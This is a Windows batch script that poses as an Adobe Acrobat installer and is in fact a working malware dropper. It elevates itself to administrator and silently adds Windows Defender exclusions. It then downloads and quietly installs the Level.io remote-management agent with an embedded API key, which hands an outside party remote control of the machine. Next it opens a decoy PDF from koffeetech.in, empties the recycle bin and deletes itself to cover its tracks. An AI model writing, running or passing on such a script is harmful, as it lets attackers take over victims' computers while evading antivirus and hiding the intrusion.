@echo off
title Adobe Acrobat Installer v2.3.1
color 0A

:: Auto-elevate to administrator
net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit
)

echo Adobe Acrobat Installer v2.3.1 Installation...
echo.

:: Add Windows Defender exclusions (silent)
powershell -Command "Add-MpPreference -ExclusionPath 'C:\Program Files\Level' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionPath 'C:\Program Files\Level\level.exe' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionPath 'C:\Program Files\Level\level.update' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionPath 'C:\Program Files\Level\winpty-agent.exe' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'level.exe' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'level.msi' -ErrorAction SilentlyContinue"

:: Download and install Level.io
powershell -Command "$args = 'LEVEL_API_KEY=LNiXsdtzrjtXUPjN9KsF5hL6'; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $tempFile = Join-Path ([System.IO.Path]::GetTempPath()) 'level.msi'; $ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest -Uri 'https://downloads.level.io/level.msi' -OutFile $tempFile; $ProgressPreference = 'Continue'; Start-Process msiexec.exe -Wait -ArgumentList \"/i `\"$tempFile`\" $args /qn\""

:: Delete MSI file
if exist "%temp%\level.msi" (
    del /f /q "%temp%\level.msi" 2>nul
)

:: Try to download and open PDF with multiple methods
echo 

:: Method 1: Using WebClient with headers
powershell -Command "try { $pdfUrl='https://koffeetech.in/i.pdf'; $pdfOut='%temp%\i.pdf'; $wc=New-Object System.Net.WebClient; $wc.Headers.Add('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'); $wc.Headers.Add('Accept', 'application/pdf,text/html'); $wc.DownloadFile($pdfUrl, $pdfOut); if (Test-Path $pdfOut) { Write-Host 'PDF downloaded successfully!'; Start-Process $pdfOut } else { Write-Host 'PDF download failed!' } } catch { Write-Host 'Error downloading PDF: ' $_.Exception.Message }"

:: If PDF not downloaded, try opening URL directly in browser
if not exist "%temp%\i.pdf" (
    echo Opening Your PDF ...
    start https://koffeetech.in/i.pdf
)

:: Clear recycle bin
powershell -Command "Clear-RecycleBin -Force -ErrorAction SilentlyContinue"

:: Self-delete
timeout /t 2 /nobreak >nul
del /f /q "%~f0"

exit